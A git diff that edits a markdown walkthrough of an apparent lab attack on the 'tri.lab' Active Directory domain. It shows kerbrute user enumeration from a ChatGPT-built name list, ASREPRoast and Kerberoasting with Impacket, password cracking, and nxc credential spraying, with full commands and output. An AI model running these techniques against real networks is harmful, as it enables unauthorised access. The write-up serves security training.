@@ -98,7 +98,7 @@ SMB         10.0.16.22      445    RUN-SRV          [-] tri.lab\ross: STATUS_LOG
 Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 ```
 
-Through OSINT and having ChatGPT create a username list of the 2025 U.S. Elite Triathlon Team, the attacker utilizes [kerbrute](https://github.com/ropnop/kerbrute) and successfully gathers three valid usernames.
+Through OSINT and having ChatGPT create a username list of the [2025 U.S. Elite Triathlon Team](https://www.usatriathlon.org/articles/news/usa-triathlon-announces-2025-u-s-elite-triathlon-national-team), the attacker utilizes [kerbrute](https://github.com/ropnop/kerbrute) and successfully gathers three valid usernames.
 ```zsh
 ➜ ~/tools/kerbrute userenum -d tri.lab potentials.txt --dc 10.0.16.22
 
@@ -126,11 +126,11 @@ j.reed
 t.spivey
 ```
 
-On BIKE-SRV the attacker gets a JavaScript alert upon loading the page.
+On BIKE-SRV the attacker gets a JavaScript alert upon loading the page. This appears to be a nothingburger.
 
 ![JavaScript alert on BIKE-SRV](./screenshots/1-goosepopup.png)
 
-The attacker performs an ASREPRoast attack and it yields t.spivey's hash.
+The attacker performs an [ASREPRoast](../../../2%20-%20exploitation/active%20directory/kerberos/asreproast.md) attack and it yields t.spivey's hash.
 ```zsh
 ➜ GetNPUsers.py 'tri.lab/' -usersfile users.txt -dc-ip 10.0.16.22                                              
 Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -144,7 +144,7 @@ This hash was not able to cracked, however, this information is still extremely 
 ### Privilege Escalation
 In September 2022, [Charlie Cark](https://twitter.com/exploitph) explained how Service Tickets could be obtained through `AS-REQ` requests (which are usually used for TGT requests), instead of the usual `TGS-REQ`. He demonstrated (and [implemented](https://github.com/GhostPack/Rubeus/pull/139)) how to abuse this in a Kerberoasting scenario.
 
-If an attacker knows of an account for which pre-authentication isn't required (i.e. an [ASREProastable](asreproast.md) account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication won't be required).
+If an attacker knows of an account for which pre-authentication isn't required (i.e. an [ASREPRoast](../../../2%20-%20exploitation/active%20directory/kerberos/asreproast.md) account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication won't be required).
 
 The [Impacket](https://github.com/SecureAuthCorp/impacket) script [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) can perform all the necessary steps to request a ST for a service given its SPN (or name) and valid domain credentials.
 
@@ -187,6 +187,8 @@ Hardware.Mon.#01.: Util: 95%
 
 Started: Fri Jan  9 14:26:53 2026
 Stopped: Fri Jan  9 14:27:56 2026
+
+---
 
 ➜ nxc smb hosts.txt -u 'j.reed' -p 'Utah123'
 SMB         10.0.16.22      445    RUN-SRV          [*] Windows Server 2022 Build 20348 x64 (name:RUN-SRV) (domain:tri.lab) (signing:True) (SMBv1:False) 
